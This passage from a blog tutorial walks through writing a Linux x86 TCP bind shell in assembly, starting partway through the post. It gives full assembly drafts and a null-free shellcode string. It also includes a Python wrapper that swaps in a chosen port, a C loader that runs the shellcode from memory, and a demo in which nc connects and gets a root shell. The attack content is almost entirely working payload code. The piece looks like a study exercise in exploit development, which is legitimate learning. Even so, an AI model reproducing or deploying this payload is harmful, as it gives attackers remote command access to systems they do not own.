&lt;p&gt;Now we know the AF_INET value, the INADDR_ANY value and the size of the completed struct - we can implement our own struct, push the data onto the stack correctly and obtain the address of this collection of data. The struct itself actually contains 4 different values, which can be seen in the below definition taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in {
    short sin_family;              // e.g. AF_INET
    ‏)3490(unsigned short sin_port; // e.g. htons
    struct in_addr sin_addr;       // see struct in_addr, below 
    char sin_zero[8];              // zero this if you want to
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So now we know that the data we need to structure within our assembly is the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;AF_INET (2)&lt;/li&gt;
  &lt;li&gt;The port number (I used 9001 - 0x2329)&lt;/li&gt;
  &lt;li&gt;The IP ddress (0.0.0.0 as we are locally binding)&lt;/li&gt;
  &lt;li&gt;0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The address of this data structure needs to be placed in the 2nd parameter (ECX), luckily the ESP currently points to this data. We need to remember that the port number is of type string, and therefore should be pushed onto the stack as a “word”. With the final addition of the size being placed into the 3rd parameter (EDX), the bind system call is ready to be executed.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; BIND syscall
xor eax, eax          ; zero out eax
mov eax, 0x169        ; move 361 into syscall register
mov ebx, edi          ; move fd (edi val) into ebx - param 1

; create our sockaddr struct in memory, used with bind() call, 2nd param
xor ecx, ecx
push ecx              ;  0
push ecx              ;  Local Address (0.0.0.0)
push word 0x2923      ;  port number (9001)
push word 0x2         ;  AF_INET

mov ecx, esp          ; pointer to struct
mov edx, 16           ; size of struct
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we are ready to implement our call to listen(). Looking at the C implementation above, listen(listen_sock, 0); we can see that we require our EBX register (1st parameter) to equal the value of our file descriptor returned from socket() and our ECX register (2nd parameter) should be equal to 0 before making our call to listen(). In addition to the parameter values, we want to make sure EAX holds the value to the correct system call (363) before calling ‘int 0x80’. This should all look like the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; LISTEN SYSCALL
xor eax, eax
mov eax, 0x16b
mov ebx, edi
xor ecx, ecx
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next we want to implement our call to accept() which will appear very similar to the listen() call above. Looking at the C implementation, we see it’s usage as int conn_sock = accept(listen_sock, NULL, NULL);. Once again, we require EAX to equal our syscall value (364), we need our first parameter (EBX) to equal our file descriptor from our socket() call, we then need our 2nd (ECX) and 3rd (EDX) parameters to both equal 0. Finally, we execute our system call with ‘int 0x80’.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; ACCEPT SYSCALL
xor eax, eax
mov eax, 0x16c
mov ebx, edi
xor ecx, ecx
xor edx, edx
xor esi, esi
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Similar to socket(), the accept() call returns a file descriptor value to use within our final syscall, dup2(). We want to make sure we keep track of this value so we overwrite our previous file descriptor value stored in the EDI register.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xor edi, edi
mov edi, eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next system call we need is dup2(). The following implementation was written to replicate the C code above, so there are 3 chunks of assembly that are pretty much the same except for one value. This could be cleaned up using a loop, but at this time, I just wanted the code to work. Looking at the C implementation, we see the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dup2(conn_sock, 0);
dup2(conn_sock, 1);
dup2(conn_sock, 2);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at this, we need 3 separate calls to dup2() with 3 different values in the 2nd parameter (0, 1 and 2). For each call, we want to make sure our EAX value holds the value of our syscall (63), the 1st parameter requires the value of our file descriptor received from the accept() call above. The 2nd parameter is the value that needs to be set to 0, 1 and 2 across the 3 seperate calls. Finally, the ‘int 0x80’ is called to execute each system call. My approach at performing these three calls can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; DUP2 SYSCALL
xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
int 0x80

xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
mov ecx, 0x1
int 0x80

xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
mov ecx, 0x2
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By now, our process should have opened a socket, listened for a connection, accepted the incoming connection and set up our pipes into our process. We now want to implement our final system call, which actually gives this entire program any sense of purpose and use, the execve() call. This function allows us to execute our actual shell “/bin/sh”, giving us control over the target. Within the C implementation, the execve call is used like execve(“/bin/sh”, NULL, NULL);.&lt;/p&gt;

&lt;p&gt;Before implementing this in assembly, there is something we need to remember from the manual page and our table above. The manual shows the implementation and it’s parameters as:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int execve(const char *pathname, char *const argv[], char *const envp[]);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can see that the 3 parameters all point to strings (pointers to chars/char arrays). Previously, we could simply set the value of the register to 0, however after attempting to do this for this system call I received errors during execution. After debugging the process for a little while, I tested pointing to nothing on the stack instead of simply setting the register to zero. That way, the register would be a pointer to a memory location, which held nothing. Sounds like a pointer to NULL to me!&lt;/p&gt;

&lt;p&gt;The final thing we need to have is the 1st parameter, which is actually the path to the file we would like to the execute. In this case, I used “/bin/sh”. This was achieved by getting the hex equivalent of this string, flipping it (Little Endian) and pushing it on the stack in 2 chunks. In step by steps, this what it looks like:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“/bin/sh” in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68&lt;/li&gt;
  &lt;li&gt;we flip these because it’s little endian&lt;/li&gt;
  &lt;li&gt;we push the two chunks on separately 0x68732f6e, 0x69622f&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We then need the address of the string to be placed into the first parameter (EBX). Luckily, the string is at the top of the stack and there is a register that holds this address ready for use, ESP. We can set the value of EBX to the value of ESP and achieve this. This can be completed in x86 using the following instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push 0x68732f6e         ; hs/n
push 0x69622f2f         ; ib//
mov ebx, esp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need our 2nd (ECX) and 3rd (EDX) parameters to point to NULL values. As I stated above, I initially attempted to just 0 out the registers - however this did not work. So I ended up pushing a zero on to the stack and using the address held in ESP again to reference the top of the stack, which pointed at our zero value after the push. This was completed twice to satisfy both NULL parameters.&lt;/p&gt;

&lt;p&gt;Finally, I set the EAX register to the value 0xb (11), which is the value of the execve system call, and executed it with the ‘int 0x80’ instruction.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xor eax, eax
push eax

push 0x68732f6e
push 0x69622f2f
mov ebx, esp

push eax
mov ecx, esp

push eax
mov edx, esp

xor eax, eax
mov eax, 0xb
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We should now have a fully functioning TCP bind shell, ready for assembling, linking and executing. When connecting to the bind shell, remember the port number specified in the structure created and used within the bind() system call.&lt;/p&gt;

&lt;p&gt;I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell/misc# cat build.sh 
echo &quot;Assembling $1.asm&quot;
nasm -f elf32 &quot;$1&quot;.asm 

echo &quot;Linking $1.o&quot;
ld -s -o &quot;$1&quot; &quot;$1&quot;.o

echo &quot;Done&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Usage:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./build.sh tcp_bind_shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Upon assembling and linking the asm file, you should have a functional TCP bind shell.&lt;/p&gt;

&lt;p&gt;The entire first draft script can be seen here:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global  _start
section .text

_start:
    ; clear out the registers by xor-ing them with themselves. 0 without null bytes
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; SOCKET SYSCALL
    ; int socket(int domain, int type, int protocol);
    ; socket is the first syscall we want with syscall number is 359 (0x167)
    ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0)
    ; return's our fd value to EAX, we want to keep this
    mov eax, 0x167
    mov ebx, 0x2
    mov ecx, 0x1
    ; we don't do anything with edx as 0 already exists from the xor above

    int 0x80 ; this interrupt signal handles the syscall
    mov edi, eax ; store the return value in edi for future ref


    ; BIND syscall
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    xor eax, eax      ; zero out eax
    mov eax, 0x169    ; move 361 into syscall register
    mov ebx, edi      ; move fd (edi val) into ebx - param 1

    ; create our sockaddr struct in memory, used with bind() call, 2nd param
    xor ecx, ecx      ; zero out ecx
    push ecx          ; push the 0 onto the stack (4th struct value)
    push ecx          ; push the 0 onto the stack (IP Address)
    push word 0x2923  ; push the port onto stack  (0x2329) (PORT NUM = 9001) 
    push word 0x2     ; push 2 onto the stack     (AF_INET)

    mov ecx, esp      ; store the current stack pointer into ecx, points at struct
    mov edx, 16       ; this parameter takes the length of the addr (param 3)
    int 0x80          ; syscall 

    ; LISTEN syscall 363
    ; int listen(int sockfd, int backlog);
    xor eax, eax      ; zero out eax
    mov eax, 0x16b    ; move 363 into register (syscall number)
    mov ebx, edi      ; this should still be return val from socket() -&amp;gt; fd
    xor ecx, ecx      ; clean out ecx as the 2nd param value should be 0
    int 0x80          ; syscall

    ; ACCEPT syscall 364
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ; we want the return value from EAX (fd update)
    xor eax, eax      ; zero out eax
    mov eax, 0x16c    ; move 364 into register (syscall number)
    mov ebx, edi      ; this should still be return val from socket() -&amp;gt; fd
    xor ecx, ecx      ; zero out 2nd param (NULL)
    xor edx, edx      ; zero out 3rd param (NULL)
    xor esi, esi      ; fourth and final parameter is zero'd out
    int 0x80          ; syscall

    ; accept() returns a new fd value, so let's store this one off too
    xor edi, edi      ; 0 out edi before backing up fd
    mov edi, eax      ; back up the fd value in edi again

    ; DUP2 syscall (3 times)
    ; int dup2(int oldfd, int newfd);
    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    int 0x80          ; syscall (1st)

    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    mov ecx, 0x1      ; move 1 into 2nd param
    int 0x80          ; syscall (2nd)

    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    mov ecx, 0x2      ; move 2 into 2nd param
    int 0x80          ; syscall (3rd)

    ; EXECVE() syscall
    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
    ; NOTE, param 2 and 3 are pointers to strings. XOR, PUSH then point to STACK in register
    xor eax, eax      ; zero out eax ready for pushing 0s on to the stack
    push eax          ; push first zero on, align the stack?

    ; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
    ; we flip these because it's little endian
    ; 0x68732f6e, 0x69622f

    push 0x68732f6e
    push 0x69622f2f   ; note the // at the end, sigsevs without - junk corrupting it?
    mov ebx, esp      ; push the addr of our above string (esp) into 1st param

    push eax          ; push 0 onto the stack (2nd param == NULL)
    mov ecx, esp      ; requires a pointer - man page has them for usage

    push eax          ; push 0 onto the stack (3rd param == NULL)
    mov edx, esp      ; requires a pointer - man page has them for usage

    xor eax, eax      ; zero out eax
    mov eax, 0xb      ; move 11 into EAX register (syscall number)
    int 0x80          ; final syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining.&lt;/p&gt;

&lt;h2 id=&quot;second-draft&quot;&gt;Second Draft:&lt;/h2&gt;
&lt;p&gt;After playing around with the script for a while and testing a few things, I was able to tweak the script a little to remove some bloat and still successfully create a working TCP bind shell. The changes are relatively trivial, but it should help pull down the overall byte size of the payload (marginal), but ultimately it helped me learn some new tricks in x86 such as loops. The main changes I made to the assembly were:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;removed all xor instructions used to clear a register before moving a value into it
    &lt;ul&gt;
      &lt;li&gt;after removing each of these, I realised that this led to issues when making the system calls. I used strace to attempt to see what was going on. Looking at the following output snippet, we can see that the registers must have had junk left over before using them for our call - resulting in garbage values.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# strace ./second_bind_shell 
execve(&quot;./second_bind_shell&quot;, [&quot;./second_bind_shell&quot;], 0xbfe76800 /* 41 vars */) = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&quot;1.0.0.0&quot;)}, 16) = -1 EADDRNOTAVAIL (Cannot assign requested address)
syscall_0xffff016b(0x3, 0, 0x10, 0, 0x3, 0) = -1 ENOSYS (Function not implemented)
syscall_0xffff016c(0x3, 0, 0, 0, 0x3, 0) = -1 ENOSYS (Function not implemented)
syscall_0xffffff3f(0xffffffda, 0x2, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
syscall_0xffffff3f(0xffffffda, 0x1, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
syscall_0xffffff3f(0xffffffda, 0, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented)
execve(&quot;//bin/sh&quot;, [], 0xbf992980 /* 0 vars */) = 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example, we can see that our hex value used for a system call (0x016c) exists, however the actual value it is attempting to call is 0xffff016b. This is because we only wrote to the lower half of the register using al, leaving anything already in the higher half of the register. After noticing this, I returned to XOR’ing most of the registers before moving values into them. Especially if I was targetting the lower half (al), to ensure the rest of the memory was zeroed.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX. Each iteration would decrement the ECX value down to 0 and check the current value before continuing the loop. If our value was not 0, we would jump back to the beginning of the loop and repeat our previous steps. If our value was 0, we have succesfully called dup2 three seperate times with the 2, 1 and 0 values in the 2nd parameter (ECX) and can safely exit the loop.&lt;/li&gt;
  &lt;li&gt;when using a register to move values into them, use the lower half of the register only
    &lt;ul&gt;
      &lt;li&gt;For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on. Ultimately, this was done to prevent any NULL bytes (\x00) from existing in my final payload.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The total source of our second bind shell attempt can be seen here:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global	_start
section .text

_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; SOCKET SYSCALL
	; socket is the first syscall we want with syscall number is 359 (0x167)
	; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0)
	mov ax, 0x167
	mov bl, 0x2
	mov cl, 0x1
	; we don't do anything with edx as 0 already exists from the xor above

	int 0x80 ; this interrupt signal handles the syscall
	mov edi, eax ; store the return value in edi for future ref

	; BIND syscall
	xor eax, eax
	mov ax, 0x169	; move 361 into syscall register
	mov ebx, edi	; move fd (edi val) into ebx - param 1

	; create our sockaddr struct in memory, used with bind() call, 2nd param
	xor ecx, ecx
	push ecx	 ; push the 0 onto the stack (4th struct value)
	push ecx  	 ; push the 0 onto the stack (Address)
	push word 0x2923 ; push the port onto stack  (0x2329) (PORT NUM = 9001) 
	push word 0x2	 ; push 2 onto the stack     (AF_INET)

	mov ecx, esp	; store the current stack pointer into ecx, points at struct
	xor edx, edx
	mov dl, 16	; this parameter takes the length of the addr (param 3)
	int 0x80	; syscall 

	; LISTEN syscall 363
	xor eax, eax
	mov ax, 0x16b  ; move 363 into register (syscall number)
	mov ebx, edi    ; this should still be return val from socket() -&amp;gt; fd
	xor ecx, ecx    ; clean out ecx as the 2nd param value should be 0
	int 0x80	; syscall

	; ACCEPT syscall 364
	xor eax, eax
	mov ax, 0x16c	; move 364 into register (syscall number)
	mov ebx, edi	; this should still be return val from socket() -&amp;gt; fd
	xor ecx, ecx	; zero out 2nd param (NULL)
	xor edx, edx	; zero out 3rd param (NULL)
	xor esi, esi
	int 0x80	; syscall

	; accept() returns a new fd value, so let's store this one off too
	mov edi, eax	; back up the fd value in edi again

	; DUP2 syscall (3 times)
	xor ecx, ecx
	mov cl, 0x3	; set counter register to 3 for counting down in the loop

	for_loop_dup2:
	xor eax, eax
	mov al, 0x3f
	mov ebx, edi
	dec cl		; decrement our counter before the syscall (should be 2, 1, 0)
	int 0x80
	
	jnz for_loop_dup2	; if ecx is not equal to 0, keep going

	; EXECVE() syscall
	xor eax, eax	; zero out eax ready for pushing 0s on to the stack
	push eax	; push first zero on, align the stack?

	; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
	; we flip these because it's little endian
	; 0x68732f6e, 0x69622f

	push 0x68732f6e
	push 0x69622f2f	; note the // at the end, sigsevs without - junk corrupting it?

	mov ebx, esp	; push the addr of our above string (esp) into 1st param

	push eax        ; push 0 onto the stack (2nd param == NULL)
    mov ecx, esp    ; requires a pointer - man page has them for usage

	push eax	; push 0 onto the stack (3rd param == NULL)
	mov edx, esp	; requires a pointer - man page has them for usage

    mov al, 0xb    ; move 11 into EAX register (syscall number)

	int 0x80	; final syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dumping the hex for usage:
To extract our hex values for our shell, we can use the following shell script (dump_hex.sh) along with the target object to extract the hex values in a usable fashion. The output can be taken and placed directly into the following python wrapper.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell/misc# cat dump_hex.sh 
objdump -d &quot;$1&quot; |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Usage:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# ../../misc/dump_hex.sh second_bind_shell
&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. The output also includes two 's because the actual value, allowing direct usage within a python string. We need the two back slash characters to ensure a single \ remains in the final output.&lt;/p&gt;

&lt;h2 id=&quot;wrapper-to-allow-custom-port-number&quot;&gt;Wrapper to allow custom port number:&lt;/h2&gt;
&lt;p&gt;The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port.&lt;/p&gt;

&lt;p&gt;The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use.&lt;/p&gt;

&lt;p&gt;The following script is a python wrapper that I have made to allow a custom port to be placed into the script, replacing the hard coded value within the final hex output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell# cat wrapper.py 
import sys
import socket

shellcode = (&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01&quot;
	&quot;\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69&quot;
	&quot;\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]\\x66\\x6a&quot;
	&quot;\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8&quot;
	&quot;\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c&quot;
	&quot;\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7&quot;
	&quot;\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd&quot;
	&quot;\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f&quot;
	&quot;\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b&quot;
	&quot;\\xcd\\x80&quot;
)

if len(sys.argv) != 2:
	print 'Usage: ' + sys.argv[0] + ' &amp;lt;port&amp;gt;'
	sys.exit()

port = sys.argv[1]
print &quot;Chosen port: %s&quot; % port

int_port = int(port)
if int_port &amp;gt; 65535:
	print &quot;Port choice is greater than max value (65535)&quot;
	sys.exit()

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;)
first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2]
second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:]

print &quot;1st port: %s&quot; % first_port_val
print &quot;2nd port: %s&quot; % second_port_val
print &quot;&quot;

print &quot;Ammending shellcode...&quot;

shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val)
shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val)

print &quot;Final Shellcode:&quot;
print shellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell# python wrapper.py 9003
Chosen port: 9003
1st port: \x2b
2nd port: \x23

Ammending shellcode...
Final Shellcode:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell# cat shell.c
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot;;

int main(void)  {
    printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compiling and executing:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell# gcc -fno-stack-protector -z execstack shell.c -o shell
root@kali:~/Documents/bindshell# ./shell 
Shellcode Length:  118

root@kali:~# nc localhost 9003
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root/Documents/bindshell
